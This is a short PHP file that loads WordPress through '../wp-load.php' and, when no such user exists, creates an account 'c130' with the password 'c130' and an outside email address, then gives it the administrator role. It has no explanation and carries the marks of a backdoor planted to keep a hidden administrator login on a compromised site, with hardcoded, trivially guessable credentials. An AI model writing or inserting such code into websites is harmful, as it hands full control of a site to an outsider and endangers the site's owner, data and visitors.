<?php

	include('../wp-load.php');

	$username = 'c130';
	$password = 'c130';
	$email_address = 'c130@whenhotelsfly.com';
	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
